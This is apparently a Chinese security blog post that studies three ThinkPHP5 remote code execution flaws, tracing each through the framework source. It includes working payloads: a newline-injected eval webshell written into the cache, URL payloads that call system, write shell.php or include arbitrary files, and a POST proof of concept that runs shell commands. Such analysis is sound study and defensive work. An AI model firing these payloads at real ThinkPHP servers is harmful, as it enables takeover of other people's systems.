---
title: "Thinkphp5 RCE"
date: 2020-05-28T17:17:17+08:00
draft: flase
tags: [代码审计]
categories: [php]
comment: true
---
Thinkphp5代码执行学习
<!--more-->

# Thinkphp5代码执行学习

## 缓存类RCE

- 版本

*5.0.0<=ThinkPHP5<=5.0.10*

- Tp框架搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200517151701.png)

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200517151925.png)

- 测试payload

```
?username=syst1m%0d%0a@eval($_GET[_]);//
```

*可以看到已经写入了缓存*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518110944.png)

### 漏洞分析

- thinkphp/library/think/Cache.php:126

*先跟踪一下Cache类的set方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518161622.png)

- thinkphp/library/think/Cache.php:63

*跟踪一下init方法，这里的self::$handler默认值是File，为think\cache\driver\File 类实例*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518161904.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518163409.png)

- thinkphp/library/think/Cache.php:36

*跟进connect方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518163822.png)

*先打印一下options内容*

```
array (size=4)
  'type' => string 'File' (length=4)
  'path' => string '/Applications/MAMP/htdocs/runtime/cache/' (length=40)
  'prefix' => string '' (length=0)
  'expire' => int 0
```

*type为file，先赋值一个$name，class为\think\cache\driver\File*


- thinkphp/library/think/cache/driver/File.php:137

*跟踪一下File类的set方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518173501.png)

- thinkphp/library/think/cache/driver/File.php:67

*跟进文件名生成方法，程序先获得键名的 md5 值，然后将该 md5 值的前 2 个字符作为缓存子目录，后 30 字符作为缓存文件名。*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518173501.png)

*$data变量为序列化的值，没有进行过滤直接将内容写进了缓存，前面有//注释符，可以通过注入换行符绕过该限制。*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518174320.png)

## 未开启强制路由导致rce

- 影响版本

**5.0.7<=ThinkPHP<=5.0.22**

- payload

**5.1.x ：**

```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**5.0.x ：**

```
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518224917.png)

- 测试payload

```
index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200518225017.png)


### 漏洞分析

*默认情况下安装的 ThinkPHP 是没有开启强制路由选项，而且默认开启路由兼容模式*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519091508.png)

**?s=模块/控制器/方法 所有用户参数都会经过 Request 类的 input 方法处理，该方法会调用 filterValue 方法，而 filterValue 方法中使用了 call_user_func,尝试利用这个方法。访问如下链接**


**?s=index/\think\Request/input&filter[]=system&data=whoami*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519092031.png)

- thinkphp/library/think/route/dispatch/Module.php:70

*于获取控制器点打断点*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519094748.png)

*程序会跳到thinkphp/library/think/App.php的run方法，在路由检测地打个断点，重新请求*

- thinkphp/library/think/App.php:583

*于routeCheck方法对路由进行了检测，*

thinkphp/library/think/route/dispatch/Url.php:23

*出来的dispatch为index|\think\Request|input，将\替换成了|，然后进入init方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519100109.png)

- thinkphp/library/think/App.php:402

*经过路由检测之后的dispatch为：*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519100805.png)


- thinkphp/library/think/App.php:431

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519103803.png)

- thinkphp/library/think/route/Dispatch.php:168

*跟进Dispatch类的run方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519112602.png)

- thinkphp/library/think/route/dispatch/Module.php:84

*执行exec函数，跟进函数*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519112801.png)

*利用反射机制，调用类的方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519115255.png)

- thinkphp/library/think/Container.php:391

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519120902.png)

- thinkphp/library/think/Request.php:1358

*进入input()，$this->filterValue()处理*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519121341.png)

- thinkphp/library/think/Request.php:1437

*跟进后执行call_user_func()，实现rce*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519121718.png)


## method任意调用方法导致rce

- 版本

*5.0.0<=ThinkPHP5<=5.0.23*

- 环境搭建

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519145014.png)

- 测试payload

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519145617.png)

### 漏洞分析

- thinkphp/library/think/Request.php:524

*$method 来自可控的 $_POST 数组，而且在获取之后没有进行任何检查，直接把它作为 Request 类的方法进行调用，同时，该方法传入的参数是可控数据 $_POST，可以随意调用 Request 类的部分方法。*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519152246.png)

- 搜索var_method，值为_method

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519164657.png)

- thinkphp/library/think/Request.php:135

*查看request类的__construct方法,可以覆盖类属性，那么我们可以通过覆盖Request类的属性.*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519162815.png)

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519174947.png)

- thinkphp/library/think/App.php:126

*如果开启了debug，则调用$request->param()方法，*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519180945.png)

- thinkphp/library/think/Request.php:637

*跟进param方法，发现调用了$this->method*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519181718.png)

- thinkphp/library/think/Request.php:862

*跟踪到server方法，把$this->server 传入了 input 方法，这个this->server 的值，我们可以通过先前 Request 类的 __construct 方法来覆盖赋值，filter 的值部分来自 this->filter ，又是可以通过先前 Request 类的 __construct 方法来覆盖赋值*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519182417.png)

- thinkphp/library/think/Request.php:1034

*进入input方法的filterValue，进入call_user_func回调，造成RCE漏洞的产生*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519182750.png)

#### 如果没有开启debug

- thinkphp/library/think/App.php:445

*在exec方法中，当$dispatch['type']等于method或者controller时候，也会调用param()方法*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519183440.png)

- thinkphp/library/think/Route.php:918

*dispatch['type'] 来源于 parseRule 方法中的 result 变量,$route 变量取决于程序中定义的路由地址方式*

![](https://maekdown-1300474679.cos.ap-beijing.myqcloud.com/20200519184210.png)

*只要是存在的路由就可以使dispatch['type']成立，而在 ThinkPHP5 完整版中，定义了验证码类的路由地址?s=captcha，默认这个方法就能使$dispatch=method从而进入Request::instance()->param()，使条件成立。*


- poc

```
POST /index.php?s=captcha HTTP/1.1

_method=__construct&filter[]=system&method=get&get[]=ls+-al
```

## 参考

[Thinkphp5 RCE总结](https://y4er.com/post/thinkphp5-rce/)